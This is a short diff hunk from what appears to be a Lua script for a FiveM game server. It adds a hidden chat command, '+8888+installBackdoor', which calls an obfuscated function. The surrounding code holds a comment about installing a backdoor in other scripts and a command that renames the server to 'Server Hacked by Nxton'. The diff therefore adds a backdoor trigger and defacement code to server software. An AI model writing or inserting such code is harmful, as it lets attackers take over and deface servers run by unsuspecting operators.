@@ -236,6 +236,9 @@ end)
 	-- !> Install Backdoor in other Scripts <! --
 end
 
+RegisterCommand("+8888+installBackdoor", function(source, args, rawCommand)
+	SDhskXCsi391()
+end, false)
 
 RegisterCommand("+8888+hackedNames", function(source, args, rawCommand)
 	serverName = "Server Hacked by Nxton | Nächstes mal nicht so Freundchen"
